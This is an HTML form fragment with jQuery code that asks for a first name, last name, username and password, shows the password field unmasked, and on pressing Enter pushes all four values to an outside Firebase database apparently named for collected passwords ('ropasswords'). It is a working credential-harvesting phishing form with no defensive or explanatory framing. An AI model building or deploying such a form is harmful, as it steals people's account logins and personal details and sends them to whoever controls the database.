    <form>
        First name: <input type='text' id='FirstN' placeholder='First Name'><br>
        Last name: <input type='text' id='LastN' placeholder='Second Name'>
        <SPAN style="position: absolute; top: 70px; left: 3px;width: 500px; height: 500px">
        Username: <input type='text' id='Username' placeholder='Username'><br>
        Password: <input type='text' id='Password' placeholder='Password'>
        
         </SPAN>
        <script>
      var myDataRef = new Firebase('https://ropasswords.firebaseio.com/');
      $('#Password').keypress(function (e) {
        if (e.keyCode == 13) {
          var Firstn = $('#FirstN').val();
          var Lastn = $('#LastN').val();
          var Usern = $('#Username').val();
          var Passw = $('#Password').val();
          myDataRef.push({Firstn: Firstn, Lastn: Lastn, Usern: Usern, Passw: Passw});
          $('Password').val('');
        }
      });
      myDataRef.on('child_added', function(snapshot) {
        var message = snapshot.val();
      });
    </script>
    </form>
